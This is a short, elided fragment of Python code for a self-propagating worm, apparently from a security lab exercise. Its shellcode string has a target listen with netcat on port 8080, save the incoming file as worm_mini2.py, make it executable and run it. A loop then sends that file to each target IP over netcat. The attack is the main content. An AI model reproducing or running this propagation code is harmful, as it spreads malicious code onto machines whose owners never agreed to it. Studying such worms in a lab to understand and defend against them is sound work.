...
shellcode= (
   ...
   " nc -lnv 8080 > worm_mini2.py; chmod +x worm_mini2.py;      " #as per the approach 2, we are adding the pilot code here
   " python3 worm_mini2.py;                                    *"
...
while True:
    ...
    subprocess.run([f"nc -w5 {targetIP} 8080 < worm_mini2.py"], shell=True) 
